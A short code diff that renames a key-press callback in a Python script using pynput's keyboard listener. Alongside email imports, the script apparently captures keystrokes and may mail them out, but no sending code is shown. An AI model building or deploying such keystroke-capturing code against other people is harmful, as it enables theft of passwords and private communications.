@@ -6,7 +6,7 @@ from email import encoders
 from pynput import keyboard
 import datetime
 
-def keyPressed(key):
+def key_pressed(key):
     try:
         char = key.char
         if char is not None: 
@@ -22,7 +22,7 @@ def keyPressed(key):
             return False
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
+    listener = keyboard.Listener(on_press=key_pressed)
     listener.start()
     listener.join()  
 
